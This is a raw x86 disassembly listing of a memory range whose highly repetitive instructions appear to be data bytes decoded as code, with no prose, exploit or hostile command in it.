  44e7f1:	add    BYTE PTR [eax],al
  44e7f3:	sbb    eax,0x1d000007
  44e7f8:	pop    es
  44e7f9:	add    BYTE PTR [eax],al
  44e7fb:	or     eax,0xd000007
  44e800:	pop    es
  44e801:	add    BYTE PTR [eax],al
  44e803:	fld    QWORD PTR [esi]
  44e805:	add    BYTE PTR [eax],al
  44e807:	fld    QWORD PTR [esi]
  44e809:	add    BYTE PTR [eax],al
  44e80b:	int    0x6
  44e80d:	add    BYTE PTR [eax],al
  44e80f:	int    0x6
  44e811:	add    BYTE PTR [eax],al
  44e813:	fld    QWORD PTR [esi]
  44e815:	add    BYTE PTR [eax],al
  44e817:	fld    QWORD PTR [esi]
  44e819:	add    BYTE PTR [eax],al
  44e81b:	hlt    
  44e81c:	sub    edi,esp
  44e81e:	push   esp
  44e820:	sub    edi,esp
  44e822:	push   esp
  44e824:	sub    edi,esp
  44e826:	inc    DWORD PTR [eax]
	...
  44e840:	hlt    
  44e841:	sub    edi,esp
  44e843:	push   esp
  44e845:	sub    edi,esp
  44e847:	push   esp
  44e849:	sub    edi,esp
  44e84b:	push   esp
  44e84d:	sub    edi,esp
  44e84f:	push   esp
  44e851:	sub    edi,esp
  44e853:	push   esp
  44e855:	sub    edi,esp
  44e857:	push   esp
  44e859:	sub    edi,esp
  44e85b:	push   esp
  44e85d:	sub    edi,esp
  44e85f:	push   esp
  44e861:	sub    edi,esp
  44e863:	push   esp
  44e865:	sub    edi,esp
  44e867:	push   esp
  44e869:	sub    edi,esp
  44e86b:	push   esp
  44e86d:	sub    edi,esp
  44e86f:	push   esp
  44e871:	sub    edi,esp
  44e873:	push   esp
  44e875:	sub    edi,esp
  44e877:	push   esp
  44e879:	sub    edi,esp
  44e87b:	push   esp
  44e87d:	sub    edi,esp
  44e87f:	push   esp
  44e881:	sub    edi,esp
  44e883:	push   esp
  44e885:	sub    edi,esp
  44e887:	push   esp
  44e889:	sub    edi,esp
  44e88b:	push   esp
  44e88d:	sub    edi,esp
  44e88f:	push   esp
  44e891:	sub    edi,esp
  44e893:	push   esp
  44e895:	sub    edi,esp
  44e897:	push   esp
  44e899:	sub    edi,esp
  44e89b:	push   esp
  44e89d:	sub    edi,esp
  44e89f:	push   esp
  44e8a1:	sub    edi,esp
  44e8a3:	inc    DWORD PTR [eax]
	...
  44e8bd:	hlt    
  44e8be:	sub    edi,esp
  44e8c0:	push   esp
  44e8c2:	sub    edi,esp
  44e8c4:	push   esp
  44e8c6:	add    al,0xe7
  44e8c8:	add    esi,esp
  44e8ca:	add    al,0xe7
  44e8cc:	add    esi,esp
  44e8ce:	add    al,0xe7
  44e8d0:	add    esi,esp
  44e8d2:	add    al,0xe7
  44e8d4:	add    esi,esp
  44e8d6:	add    al,0xe7
  44e8d8:	add    esi,esp
  44e8da:	add    al,0xe7
  44e8dc:	add    esi,esp
  44e8de:	add    al,0xe7
  44e8e0:	add    esi,esp
  44e8e2:	add    al,0xe7
  44e8e4:	add    esi,esp
  44e8e6:	add    al,0xe7
  44e8e8:	add    esi,esp
  44e8ea:	add    al,0xe7
  44e8ec:	add    esi,esp
  44e8ee:	add    al,0xe7
  44e8f0:	add    esi,esp
  44e8f2:	add    al,0xe7
  44e8f4:	add    esi,esp
  44e8f6:	add    al,0xe7
  44e8f8:	add    esi,esp
  44e8fa:	add    al,0xe7
  44e8fc:	add    esi,esp
  44e8fe:	add    al,0xe7
  44e900:	add    esi,esp
  44e902:	add    al,0xe7
  44e904:	add    esi,esp
  44e906:	add    al,0xe7
  44e908:	add    esi,esp
  44e90a:	add    al,0xe7
  44e90c:	add    esi,esp
  44e90e:	add    al,0xe7
  44e910:	add    esi,esp
  44e912:	add    al,0xe7
  44e914:	add    esi,esp
  44e916:	add    al,0xe7
  44e918:	add    esi,esp
  44e91a:	add    al,0xe7
  44e91c:	add    esi,esp
  44e91e:	add    al,0xe7
  44e920:	add    eax,DWORD PTR [eax]
	...
  44e93a:	hlt    
  44e93b:	add    al,0xe7
  44e93d:	add    esi,esp
  44e93f:	add    al,0xe7
  44e941:	add    esi,esp
  44e943:	add    al,0xe7
  44e945:	add    esi,esp
  44e947:	add    al,0xe7
  44e949:	add    esi,esp
  44e94b:	add    al,0xe7
  44e94d:	add    esi,esp
  44e94f:	add    al,0xe7
  44e951:	add    esi,esp
  44e953:	add    al,0xe7
  44e955:	add    esi,esp
  44e957:	add    al,0x0
  44e959:	jmp    0xe944ee55
  44e95e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e965:	jmp    0xe944ee61
  44e96a:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e971:	jmp    0xe944ee6d
  44e976:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e97d:	jmp    0xe944ee79
  44e982:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e989:	jmp    0xe944ee85
  44e98e:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e995:	jmp    0xe944ee91
  44e99a:	test   DWORD PTR [eax+eax*1],0xe9
	...
  44e9b5:	add    BYTE PTR [eax],al
  44e9b7:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e9be:	jmp    0xe944eeba
  44e9c3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e9ca:	jmp    0xe944eec6
  44e9cf:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e9d6:	jmp    0xe944eed2
  44e9db:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44e9e2:	jmp    0xe944eede
  44e9e7:	test   DWORD PTR [eax+eax*1],0x3dd00
  44e9ee:	add    ch,cl
  44e9f0:	add    eax,DWORD PTR [eax]
  44e9f2:	add    ch,cl
  44e9f4:	add    eax,DWORD PTR [eax]
  44e9f6:	add    ch,bl
  44e9f8:	add    eax,DWORD PTR [eax]
  44e9fa:	add    ch,bl
  44e9fc:	add    eax,DWORD PTR [eax]
  44e9fe:	add    ch,cl
  44ea00:	add    eax,DWORD PTR [eax]
  44ea02:	add    ch,cl
  44ea04:	add    eax,DWORD PTR [eax]
  44ea06:	add    BYTE PTR [ebp-0x62fffffd],bl
  44ea0c:	add    eax,DWORD PTR [eax]
  44ea0e:	add    BYTE PTR [ebp-0x72fffffd],cl
  44ea14:	add    eax,DWORD PTR [eax]
  44ea16:	add    BYTE PTR [ebp+0x3],bl
	...
  44ea34:	popf   
  44ea35:	add    eax,DWORD PTR [eax]
  44ea37:	add    BYTE PTR [ebp-0x72fffffd],cl
  44ea3d:	add    eax,DWORD PTR [eax]
  44ea3f:	add    BYTE PTR [ebp+0x3],bl
  44ea42:	add    BYTE PTR [eax],al
  44ea44:	pop    ebp
  44ea45:	add    eax,DWORD PTR [eax]
  44ea47:	add    BYTE PTR [ebp+0x3],cl
  44ea4a:	add    BYTE PTR [eax],al
  44ea4c:	dec    ebp
  44ea4d:	add    eax,DWORD PTR [eax]
  44ea4f:	add    BYTE PTR [ebp+0x3],bl
  44ea52:	add    BYTE PTR [eax],al
  44ea54:	pop    ebp
  44ea55:	add    eax,DWORD PTR [eax]
  44ea57:	add    BYTE PTR [ebp+0x3],cl
  44ea5a:	add    BYTE PTR [eax],al
  44ea5c:	dec    ebp
  44ea5d:	add    eax,DWORD PTR [eax]
  44ea5f:	add    BYTE PTR ds:0x1d000003,bl
  44ea65:	add    eax,DWORD PTR [eax]
  44ea67:	add    BYTE PTR ds:0xd000003,cl
  44ea6d:	add    eax,DWORD PTR [eax]
  44ea6f:	add    BYTE PTR ds:0x1d000003,bl
  44ea75:	add    eax,DWORD PTR [eax]
  44ea77:	add    BYTE PTR ds:0xf4000003,cl
  44ea7d:	sub    eax,0x2bf4fffc
  44ea82:	cld    
  44ea83:	push   esp
  44ea85:	sub    edi,esp
  44ea87:	push   esp
  44ea89:	sub    edi,esp
  44ea8b:	push   esp
  44ea8d:	sub    edi,esp
  44ea8f:	push   esp
  44ea91:	sub    edi,esp
  44ea93:	push   esp
  44ea95:	sub    edi,esp
  44ea97:	inc    DWORD PTR [eax]
	...
  44eab1:	hlt    
  44eab2:	sub    edi,esp
  44eab4:	push   esp
  44eab6:	sub    edi,esp
  44eab8:	push   esp
  44eaba:	sub    edi,esp
  44eabc:	push   esp
  44eabe:	sub    edi,esp
  44eac0:	push   esp
  44eac2:	sub    edi,esp
  44eac4:	push   esp
  44eac6:	sub    edi,esp
  44eac8:	push   esp
  44eaca:	sub    edi,esp
  44eacc:	push   esp
  44eace:	sub    edi,esp
  44ead0:	push   esp
  44ead2:	sub    edi,esp
  44ead4:	push   esp
  44ead6:	sub    edi,esp
  44ead8:	push   esp
  44eada:	sub    edi,esp
  44eadc:	push   esp
  44eade:	sub    edi,esp
  44eae0:	push   esp
  44eae2:	sub    edi,esp
  44eae4:	push   esp
  44eae6:	sub    edi,esp
  44eae8:	push   esp
  44eaea:	sub    edi,esp
  44eaec:	push   esp
  44eaee:	sub    edi,esp
  44eaf0:	push   esp
  44eaf2:	sub    edi,esp
  44eaf4:	push   esp
  44eaf6:	sub    edi,esp
  44eaf8:	push   esp
  44eafa:	sub    edi,esp
  44eafc:	push   esp
  44eafe:	sub    edi,esp
  44eb00:	push   esp
  44eb02:	sub    edi,esp
  44eb04:	push   esp
  44eb06:	sub    edi,esp
  44eb08:	push   esp
  44eb0a:	sub    edi,esp
  44eb0c:	push   esp
  44eb0e:	add    al,0xe7
  44eb10:	add    esi,esp
  44eb12:	add    al,0xe7
  44eb14:	add    eax,DWORD PTR [eax]
	...
  44eb2e:	hlt    
  44eb2f:	add    al,0xe7
  44eb31:	add    esi,esp
  44eb33:	add    al,0xe7
  44eb35:	add    esi,esp
  44eb37:	add    al,0xe7
  44eb39:	add    esi,esp
  44eb3b:	add    al,0xe7
  44eb3d:	add    esi,esp
  44eb3f:	add    al,0xe7
  44eb41:	add    esi,esp
  44eb43:	add    al,0xe7
  44eb45:	add    esi,esp
  44eb47:	add    al,0xe7
  44eb49:	add    esi,esp
  44eb4b:	add    al,0xe7
  44eb4d:	add    esi,esp
  44eb4f:	add    al,0xe7
  44eb51:	add    esi,esp
  44eb53:	add    al,0xe7
  44eb55:	add    esi,esp
  44eb57:	add    al,0xe7
  44eb59:	add    esi,esp
  44eb5b:	add    al,0xe7
  44eb5d:	add    esi,esp
  44eb5f:	add    al,0xe7
  44eb61:	add    esi,esp
  44eb63:	add    al,0xe7
  44eb65:	add    esi,esp
  44eb67:	add    al,0xe7
  44eb69:	add    esi,esp
  44eb6b:	add    al,0xe7
  44eb6d:	add    esi,esp
  44eb6f:	add    al,0xe7
  44eb71:	add    esi,esp
  44eb73:	add    al,0xe7
  44eb75:	add    esi,esp
  44eb77:	add    al,0xe7
  44eb79:	add    esi,esp
  44eb7b:	add    al,0xe7
  44eb7d:	add    esi,esp
  44eb7f:	add    al,0xe7
  44eb81:	add    esi,esp
  44eb83:	add    al,0xe7
  44eb85:	add    esi,esp
  44eb87:	add    al,0xe7
  44eb89:	add    esi,esp
  44eb8b:	add    al,0xe7
  44eb8d:	add    esi,esp
  44eb8f:	add    al,0xe7
  44eb91:	add    eax,DWORD PTR [eax]
	...
  44ebab:	hlt    
  44ebac:	add    al,0xe7
  44ebae:	add    esi,esp
  44ebb0:	add    al,0xe7
  44ebb2:	add    esi,esp
  44ebb4:	add    al,0xe7
  44ebb6:	add    esi,esp
  44ebb8:	add    al,0x0
  44ebba:	jmp    0xe944f0b6
  44ebbf:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ebc6:	jmp    0xe944f0c2
  44ebcb:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ebd2:	jmp    0xe944f0ce
  44ebd7:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ebde:	jmp    0xe944f0da
  44ebe3:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ebea:	jmp    0xe944f0e6
  44ebef:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ebf6:	jmp    0xe944f0f2
  44ebfb:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ec02:	jmp    0xe944f0fe
  44ec07:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ec0e:	jmp    0x44ec13
	...
  44ec27:	add    bh,dh
  44ec29:	add    al,0x0
  44ec2b:	jmp    0xe944f127
  44ec30:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ec37:	jmp    0xe944f133
  44ec3c:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ec43:	jmp    0xe944f13f
  44ec48:	test   DWORD PTR [eax+eax*1],0x80d00
  44ec4f:	add    BYTE PTR ds:0x1d000008,cl
  44ec55:	or     BYTE PTR [eax],al
  44ec57:	add    BYTE PTR ds:0xd000008,bl
  44ec5d:	or     BYTE PTR [eax],al
  44ec5f:	add    BYTE PTR ds:0xdd000008,cl
  44ec65:	pop    es
  44ec66:	add    BYTE PTR [eax],al
  44ec68:	fld    QWORD PTR [edi]
  44ec6a:	add    BYTE PTR [eax],al
  44ec6c:	int    0x7
  44ec6e:	add    BYTE PTR [eax],al
  44ec70:	int    0x7
  44ec72:	add    BYTE PTR [eax],al
  44ec74:	fld    QWORD PTR [edi]
  44ec76:	add    BYTE PTR [eax],al
  44ec78:	fld    QWORD PTR [edi]
  44ec7a:	add    BYTE PTR [eax],al
  44ec7c:	int    0x7
  44ec7e:	add    BYTE PTR [eax],al
  44ec80:	int    0x7
  44ec82:	add    BYTE PTR [eax],al
  44ec84:	popf   
  44ec85:	pop    es
  44ec86:	add    BYTE PTR [eax],al
  44ec88:	popf   
  44ec89:	pop    es
	...
  44eca2:	add    BYTE PTR [eax],al
  44eca4:	add    BYTE PTR [ebp-0x72fffff9],cl
  44ecaa:	pop    es
  44ecab:	add    BYTE PTR [eax],al
  44ecad:	popf   
  44ecae:	pop    es
  44ecaf:	add    BYTE PTR [eax],al
  44ecb1:	popf   
  44ecb2:	pop    es
  44ecb3:	add    BYTE PTR [eax],al
  44ecb5:	lea    eax,[edi]
  44ecb7:	add    BYTE PTR [eax],al
  44ecb9:	lea    eax,[edi]
  44ecbb:	add    BYTE PTR [eax],al
  44ecbd:	pop    ebp
  44ecbe:	pop    es
  44ecbf:	add    BYTE PTR [eax],al
  44ecc1:	pop    ebp
  44ecc2:	pop    es
  44ecc3:	add    BYTE PTR [eax],al
  44ecc5:	dec    ebp
  44ecc6:	pop    es
  44ecc7:	add    BYTE PTR [eax],al
  44ecc9:	dec    ebp
  44ecca:	pop    es
  44eccb:	add    BYTE PTR [eax],al
  44eccd:	pop    ebp
  44ecce:	pop    es
  44eccf:	add    BYTE PTR [eax],al
  44ecd1:	pop    ebp
  44ecd2:	pop    es
  44ecd3:	add    BYTE PTR [eax],al
  44ecd5:	dec    ebp
  44ecd6:	pop    es
  44ecd7:	add    BYTE PTR [eax],al
  44ecd9:	dec    ebp
  44ecda:	pop    es
  44ecdb:	add    BYTE PTR [eax],al
  44ecdd:	hlt    
  44ecde:	sbb    eax,0x1df4fffc
  44ece3:	cld    
  44ece4:	push   esp
  44ece6:	sbb    eax,0x1df4fffc
  44eceb:	cld    
  44ecec:	push   esp
  44ecee:	sbb    eax,0x1df4fffc
  44ecf3:	cld    
  44ecf4:	push   esp
  44ecf6:	sbb    eax,0x1df4fffc
  44ecfb:	cld    
  44ecfc:	push   esp
  44ecfe:	sbb    edi,esp
  44ed00:	push   esp
  44ed02:	sbb    edi,esp
  44ed04:	push   esp
  44ed06:	sbb    edi,esp
  44ed08:	inc    DWORD PTR [eax]
	...
  44ed22:	hlt    
  44ed23:	sbb    edi,esp
  44ed25:	push   esp
  44ed27:	sbb    edi,esp
  44ed29:	push   esp
  44ed2b:	sbb    edi,esp
  44ed2d:	push   esp
  44ed2f:	sbb    edi,esp
  44ed31:	push   esp
  44ed33:	sbb    edi,esp
  44ed35:	push   esp
  44ed37:	sbb    edi,esp
  44ed39:	push   esp
  44ed3b:	sbb    edi,esp
  44ed3d:	push   esp
  44ed3f:	sbb    edi,esp
  44ed41:	push   esp
  44ed43:	sbb    edi,esp
  44ed45:	push   esp
  44ed47:	sbb    edi,esp
  44ed49:	push   esp
  44ed4b:	sbb    edi,esp
  44ed4d:	push   esp
  44ed4f:	sbb    edi,esp
  44ed51:	push   esp
  44ed53:	sbb    edi,esp
  44ed55:	push   esp
  44ed57:	sbb    edi,esp
  44ed59:	push   esp
  44ed5b:	sbb    edi,esp
  44ed5d:	push   esp
  44ed5f:	sbb    edi,esp
  44ed61:	push   esp
  44ed63:	sbb    edi,esp
  44ed65:	push   esp
  44ed67:	sbb    edi,esp
  44ed69:	push   esp
  44ed6b:	sbb    edi,esp
  44ed6d:	push   esp
  44ed6f:	add    al,0xe7
  44ed71:	add    esi,esp
  44ed73:	add    al,0xe7
  44ed75:	add    esi,esp
  44ed77:	add    al,0xe7
  44ed79:	add    esi,esp
  44ed7b:	add    al,0xe7
  44ed7d:	add    esi,esp
  44ed7f:	add    al,0xe7
  44ed81:	add    esi,esp
  44ed83:	add    al,0xe7
  44ed85:	add    eax,DWORD PTR [eax]
	...
  44ed9f:	hlt    
  44eda0:	add    al,0xe7
  44eda2:	add    esi,esp
  44eda4:	add    al,0xe7
  44eda6:	add    esi,esp
  44eda8:	add    al,0xe7
  44edaa:	add    esi,esp
  44edac:	add    al,0xe7
  44edae:	add    esi,esp
  44edb0:	add    al,0xe7
  44edb2:	add    esi,esp
  44edb4:	add    al,0xe7
  44edb6:	add    esi,esp
  44edb8:	add    al,0xe7
  44edba:	add    esi,esp
  44edbc:	add    al,0xe7
  44edbe:	add    esi,esp
  44edc0:	add    al,0xe7
  44edc2:	add    esi,esp
  44edc4:	add    al,0xe7
  44edc6:	add    esi,esp
  44edc8:	add    al,0xe7
  44edca:	add    esi,esp
  44edcc:	add    al,0xe7
  44edce:	add    esi,esp
  44edd0:	add    al,0xe7
  44edd2:	add    esi,esp
  44edd4:	add    al,0xe7
  44edd6:	add    esi,esp
  44edd8:	add    al,0xe7
  44edda:	add    esi,esp
  44eddc:	add    al,0xe7
  44edde:	add    esi,esp
  44ede0:	add    al,0xe7
  44ede2:	add    esi,esp
  44ede4:	add    al,0xe7
  44ede6:	add    esi,esp
  44ede8:	add    al,0xe7
  44edea:	add    esi,esp
  44edec:	add    al,0xe7
  44edee:	add    esi,esp
  44edf0:	add    al,0xe7
  44edf2:	add    esi,esp
  44edf4:	add    al,0xe7
  44edf6:	add    esi,esp
  44edf8:	add    al,0xe7
  44edfa:	add    esi,esp
  44edfc:	add    al,0xe7
  44edfe:	add    esi,esp
  44ee00:	add    al,0x0
  44ee02:	jmp    0x44ee07
	...
  44ee1b:	add    bh,dh
  44ee1d:	add    al,0x0
  44ee1f:	jmp    0xe944f31b
  44ee24:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee2b:	jmp    0xe944f327
  44ee30:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee37:	jmp    0xe944f333
  44ee3c:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee43:	jmp    0xe944f33f
  44ee48:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee4f:	jmp    0xe944f34b
  44ee54:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee5b:	jmp    0xe944f357
  44ee60:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee67:	jmp    0xe944f363
  44ee6c:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee73:	jmp    0xe944f36f
  44ee78:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44ee7f:	jmp    0x44ee84
	...
  44ee98:	add    bh,dh
  44ee9a:	add    al,0x0
  44ee9c:	jmp    0xe944f398
  44eea1:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44eea8:	jmp    0x44f3a4
  44eead:	dec    ebp
  44eeae:	add    al,0x0
  44eeb0:	add    BYTE PTR [ebp+0x4],bl
  44eeb3:	add    BYTE PTR [eax],al
  44eeb5:	pop    ebp
  44eeb6:	add    al,0x0
  44eeb8:	add    BYTE PTR [ebp+0x4],cl
  44eebb:	add    BYTE PTR [eax],al
  44eebd:	dec    ebp
  44eebe:	add    al,0x0
  44eec0:	add    BYTE PTR ds:0x1d000004,bl
  44eec6:	add    al,0x0
  44eec8:	add    BYTE PTR ds:0xd000004,cl
  44eece:	add    al,0x0
  44eed0:	add    BYTE PTR ds:0x1d000004,bl
  44eed6:	add    al,0x0
  44eed8:	add    BYTE PTR ds:0xd000004,cl
  44eede:	add    al,0x0
  44eee0:	add    ch,bl
  44eee2:	add    eax,DWORD PTR [eax]
  44eee4:	add    ch,bl
  44eee6:	add    eax,DWORD PTR [eax]
  44eee8:	add    ch,cl
  44eeea:	add    eax,DWORD PTR [eax]
  44eeec:	add    ch,cl
  44eeee:	add    eax,DWORD PTR [eax]
  44eef0:	add    ch,bl
  44eef2:	add    eax,DWORD PTR [eax]
  44eef4:	add    ch,bl
  44eef6:	add    eax,DWORD PTR [eax]
  44eef8:	add    ch,cl
  44eefa:	add    eax,DWORD PTR [eax]
	...
  44ef14:	add    BYTE PTR [eax],al
  44ef16:	int    0x3
  44ef18:	add    BYTE PTR [eax],al
  44ef1a:	popf   
  44ef1b:	add    eax,DWORD PTR [eax]
  44ef1d:	add    BYTE PTR [ebp-0x72fffffd],bl
  44ef23:	add    eax,DWORD PTR [eax]
  44ef25:	add    BYTE PTR [ebp-0x62fffffd],cl
  44ef2b:	add    eax,DWORD PTR [eax]
  44ef2d:	add    BYTE PTR [ebp-0x72fffffd],bl
  44ef33:	add    eax,DWORD PTR [eax]
  44ef35:	add    BYTE PTR [ebp+0x5d000003],cl
  44ef3b:	add    eax,DWORD PTR [eax]
  44ef3d:	add    ah,dh
  44ef3f:	sbb    eax,0x1df4fffc
  44ef44:	cld    
  44ef45:	push   esp
  44ef47:	sbb    eax,0x1df4fffc
  44ef4c:	cld    
  44ef4d:	push   esp
  44ef4f:	sbb    eax,0x1df4fffc
  44ef54:	cld    
  44ef55:	push   esp
  44ef57:	sbb    eax,0x1df4fffc
  44ef5c:	cld    
  44ef5d:	push   esp
  44ef5f:	sbb    eax,0x1df4fffc
  44ef64:	cld    
  44ef65:	push   esp
  44ef67:	sbb    eax,0x1df4fffc
  44ef6c:	cld    
  44ef6d:	push   esp
  44ef6f:	sbb    eax,0x1df4fffc
  44ef74:	cld    
  44ef75:	push   esp
  44ef77:	sbb    eax,0xfffc
	...
  44ef90:	add    BYTE PTR [eax],al
  44ef92:	add    ah,dh
  44ef94:	sbb    edi,esp
  44ef96:	push   esp
  44ef98:	sbb    edi,esp
  44ef9a:	push   esp
  44ef9c:	sbb    edi,esp
  44ef9e:	push   esp
  44efa0:	sbb    edi,esp
  44efa2:	push   esp
  44efa4:	sbb    edi,esp
  44efa6:	push   esp
  44efa8:	sbb    edi,esp
  44efaa:	push   esp
  44efac:	sbb    edi,esp
  44efae:	push   esp
  44efb0:	sbb    edi,esp
  44efb2:	push   esp
  44efb4:	sbb    edi,esp
  44efb6:	push   esp
  44efb8:	sbb    edi,esp
  44efba:	push   esp
  44efbc:	sbb    edi,esp
  44efbe:	push   esp
  44efc0:	sbb    edi,esp
  44efc2:	push   esp
  44efc4:	sbb    edi,esp
  44efc6:	push   esp
  44efc8:	sbb    edi,esp
  44efca:	push   esp
  44efcc:	sbb    edi,esp
  44efce:	push   esp
  44efd0:	add    al,0xe7
  44efd2:	add    esi,esp
  44efd4:	add    al,0xe7
  44efd6:	add    esi,esp
  44efd8:	add    al,0xe7
  44efda:	add    esi,esp
  44efdc:	add    al,0xe7
  44efde:	add    esi,esp
  44efe0:	add    al,0xe7
  44efe2:	add    esi,esp
  44efe4:	add    al,0xe7
  44efe6:	add    esi,esp
  44efe8:	add    al,0xe7
  44efea:	add    esi,esp
  44efec:	add    al,0xe7
  44efee:	add    esi,esp
  44eff0:	add    al,0xe7
  44eff2:	add    esi,esp
  44eff4:	add    al,0xe7
  44eff6:	add    eax,DWORD PTR [eax]
	...
  44f010:	hlt    
  44f011:	add    al,0xe7
  44f013:	add    esi,esp
  44f015:	add    al,0xe7
  44f017:	add    esi,esp
  44f019:	add    al,0xe7
  44f01b:	add    esi,esp
  44f01d:	add    al,0xe7
  44f01f:	add    esi,esp
  44f021:	add    al,0xe7
  44f023:	add    esi,esp
  44f025:	add    al,0xe7
  44f027:	add    esi,esp
  44f029:	add    al,0xe7
  44f02b:	add    esi,esp
  44f02d:	add    al,0xe7
  44f02f:	add    esi,esp
  44f031:	add    al,0xe7
  44f033:	add    esi,esp
  44f035:	add    al,0xe7
  44f037:	add    esi,esp
  44f039:	add    al,0xe7
  44f03b:	add    esi,esp
  44f03d:	add    al,0xe7
  44f03f:	add    esi,esp
  44f041:	add    al,0xe7
  44f043:	add    esi,esp
  44f045:	add    al,0xe7
  44f047:	add    esi,esp
  44f049:	add    al,0xe7
  44f04b:	add    esi,esp
  44f04d:	add    al,0xe7
  44f04f:	add    esi,esp
  44f051:	add    al,0xe7
  44f053:	add    esi,esp
  44f055:	add    al,0xe7
  44f057:	add    esi,esp
  44f059:	add    al,0xe7
  44f05b:	add    esi,esp
  44f05d:	add    al,0xe7
  44f05f:	add    esi,esp
  44f061:	add    al,0x0
  44f063:	jmp    0xe944f55f
  44f068:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f06f:	jmp    0xe944f56b
	...
  44f08c:	add    bh,dh
  44f08e:	add    al,0x0
  44f090:	jmp    0xe944f58c
  44f095:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f09c:	jmp    0xe944f598
  44f0a1:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0a8:	jmp    0xe944f5a4
  44f0ad:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0b4:	jmp    0xe944f5b0
  44f0b9:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0c0:	jmp    0xe944f5bc
  44f0c5:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0cc:	jmp    0xe944f5c8
  44f0d1:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0d8:	jmp    0xe944f5d4
  44f0dd:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0e4:	jmp    0xe944f5e0
  44f0e9:	test   DWORD PTR [eax+eax*1],0x4f7e9
  44f0f0:	jmp    0x44f0f5
	...
  44f109:	add    bh,dh
  44f10b:	add    al,0x0
  44f10d:	add    BYTE PTR [ebp-0x62fffff8],bl
  44f113:	or     BYTE PTR [eax],al
  44f115:	add    BYTE PTR [ebp-0x72fffff8],cl
  44f11b:	or     BYTE PTR [eax],al
  44f11d:	add    BYTE PTR [ebp+0x8],bl
  44f120:	add    BYTE PTR [eax],al
  44f122:	pop    ebp
  44f123:	or     BYTE PTR [eax],al
  44f125:	add    BYTE PTR [ebp+0x8],cl
  44f128:	add    BYTE PTR [eax],al
  44f12a:	dec    ebp
  44f12b:	or     BYTE PTR [eax],al
  44f12d:	add    BYTE PTR [ebp+0x8],bl
  44f130:	add    BYTE PTR [eax],al
  44f132:	pop    ebp
  44f133:	or     BYTE PTR [eax],al
  44f135:	add    BYTE PTR [ebp+0x8],cl
  44f138:	add    BYTE PTR [eax],al
  44f13a:	dec    ebp
  44f13b:	or     BYTE PTR [eax],al
  44f13d:	add    BYTE PTR ds:0x1d000008,bl
  44f143:	or     BYTE PTR [eax],al
  44f145:	add    BYTE PTR ds:0xd000008,cl
  44f14b:	or     BYTE PTR [eax],al
  44f14d:	add    BYTE PTR ds:0x1d000008,bl
  44f153:	or     BYTE PTR [eax],al
  44f155:	add    BYTE PTR ds:0xd000008,cl
  44f15b:	or     BYTE PTR [eax],al
  44f15d:	add    ch,bl
  44f15f:	pop    es
  44f160:	add    BYTE PTR [eax],al
  44f162:	fld    QWORD PTR [edi]
  44f164:	add    BYTE PTR [eax],al
  44f166:	int    0x7
  44f168:	add    BYTE PTR [eax],al
  44f16a:	int    0x7
	...
  44f184:	add    BYTE PTR [eax],al
  44f186:	add    ch,bl
  44f188:	pop    es
  44f189:	add    BYTE PTR [eax],al
  44f18b:	fld    QWORD PTR [edi]
  44f18d:	add    BYTE PTR [eax],al
  44f18f:	int    0x7
  44f191:	add    BYTE PTR [eax],al
  44f193:	int    0x7
  44f195:	add    BYTE PTR [eax],al
  44f197:	popf   
  44f198:	pop    es
  44f199:	add    BYTE PTR [eax],al
  44f19b:	popf   
  44f19c:	pop    es
  44f19d:	add    BYTE PTR [eax],al
  44f19f:	hlt    
  44f1a0:	sbb    eax,0x1df4fffc
  44f1a5:	cld    
  44f1a6:	push   esp
  44f1a8:	sbb    eax,0x1df4fffc
  44f1ad:	cld    
  44f1ae:	push   esp
  44f1b0:	sbb    eax,0x1df4fffc
  44f1b5:	cld    
  44f1b6:	push   esp
  44f1b8:	sbb    eax,0x1df4fffc
  44f1bd:	cld    
  44f1be:	push   esp
  44f1c0:	sbb    eax,0x1df4fffc
  44f1c5:	cld    
  44f1c6:	push   esp
  44f1c8:	sbb    eax,0x1df4fffc
  44f1cd:	cld    
  44f1ce:	push   esp
  44f1d0:	sbb    eax,0x1df4fffc
  44f1d5:	cld    
  44f1d6:	push   esp
  44f1d8:	sbb    eax,0x1df4fffc
  44f1dd:	cld    
  44f1de:	push   esp
  44f1e0:	sbb    eax,0x1df4fffc
  44f1e5:	cld    
  44f1e6:	push   esp
  44f1e8:	sbb    eax,0xfffc
	...
  44f201:	add    BYTE PTR [eax],al
  44f203:	add    ah,dh
  44f205:	sbb    eax,0x1df4fffc
  44f20a:	cld    
  44f20b:	push   esp
  44f20d:	sbb    eax,0x1bf4fffc
  44f212:	cld    
  44f213:	push   esp
  44f215:	sbb    edi,esp
  44f217:	push   esp
  44f219:	sbb    edi,esp
  44f21b:	push   esp
  44f21d:	sbb    edi,esp
  44f21f:	push   esp
  44f221:	sbb    edi,esp
  44f223:	push   esp
